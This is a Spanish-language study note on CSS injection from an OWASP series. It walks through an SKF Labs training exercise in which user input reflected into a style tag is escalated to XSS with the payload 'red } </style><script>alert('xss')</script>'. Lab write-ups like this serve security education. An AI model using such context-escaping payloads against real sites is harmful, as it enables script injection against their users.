---
Tema: "[[OWASP]]"
---

## 🎨 CSSI - CSS Injection

La Inyección CSS (CSS Injection) es una vulnerabilidad que ocurre cuando una aplicación permite a un atacante inyectar código de hojas de estilo (CSS) arbitrario dentro del contexto de la página web. Esto puede derivar en alteraciones visuales maliciosas, extorsión de información (como robar tokens CSRF) o escalar a un **[[Cross-Site Scripting (XSS)]]**.

---

### 💻 Práctica de Laboratorio: SKF Labs

Para entender cómo funciona utilizaremos el entorno de [SKF Labs](https://github.com/blabla1337/skf-labs).

1. Nos dirigimos al directorio del laboratorio Node.js:
   ```bash
   cd skf-labs/nodeJs/CSSI
   ```
2. Instalamos las dependencias y arrancamos el servicio:
   ```bash
   npm install 
   npm start
   ```

#### 🔍 Análisis de la Aplicación
El sitio web nos presenta un formulario sencillo que nos pregunta: *"What's your favourite color?"*.  
Al ingresar un color (ej. `blue`) y presionar el botón de envío *(Submit)*, la aplicación refleja ese color pintando una palabra en la pantalla:

```text
CSS Injection

Fill in: What's your favourite color?  

[ Submit Button ]

### That's what you said:

COLOR (texto pintado del color elegido)
```

Al inspeccionar el **código fuente** de la respuesta que devuelve el servidor, notamos cómo se inyecta directamente nuestro input dentro de la etiqueta `<style>` sin sanitización:

```html
<body>
    <style>
        p.colorful {
            color: blue /* <- Nuestro input termina directamente aquí */
        }
    </style>
    <header class="header">
        <div class="wrap wide">
```

---

### 💣 Escalar CSSI a Cross-Site Scripting (XSS)

Aprovechando que la aplicación **no filtra caracteres especiales** y que nuestro texto cae justo dentro de la estructura `<style>... color: [INPUT] ...</style>`, podemos utilizar caracteres de control para **cerrar** la etiqueta de estilos prematuramente y luego inyectar scripts maliciosos.

1. **Payload base:**
   Queremos salir de la propiedad `color`, cerrar la regla de CSS (`}`) y luego cerrar la etiqueta de `<style>`.
   ```css
   red } </style>
   ```

2. **Inyección XSS:**
   Seguidamente introducimos el payload común de XSS con JavaScript:
   ```html
   <script>alert('xss')</script>
   ```

3. **Payload final inyectado en el formulario:**
   ```html
   red } </style><script>alert('xss')</script>
   ```

> [!danger] Impacto del Ataque
> Al enviar este payload, el código resultante que renderizará el navegador será:
> ```html
> <style>
>     p.colorful {
>         color: red } </style><script>alert('xss')</script>
>     }
> </style>
> ```
> De esta forma, el servidor ejecuta la alerta JS evidenciando una inyección **[[Cross-Site Scripting (XSS)]]** crítica que derivó originalmente de un vector CSS Inseguro.